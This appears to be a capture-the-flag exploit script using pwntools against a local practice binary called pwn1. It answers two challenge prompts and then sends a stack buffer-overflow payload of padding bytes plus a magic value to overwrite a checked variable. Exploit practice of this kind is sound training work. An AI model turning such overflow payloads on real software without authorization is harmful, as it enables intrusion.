from pwn import *

target = process('./pwn1')

payload =""
payload +="A"*0x2b
payload += "\xc8\x10\xa1\xde"

target.sendline("Sir Lancelot of Camelot")
target.sendline("To seek the Holy Grail.")

target.sendline(payload)

target.interactive()
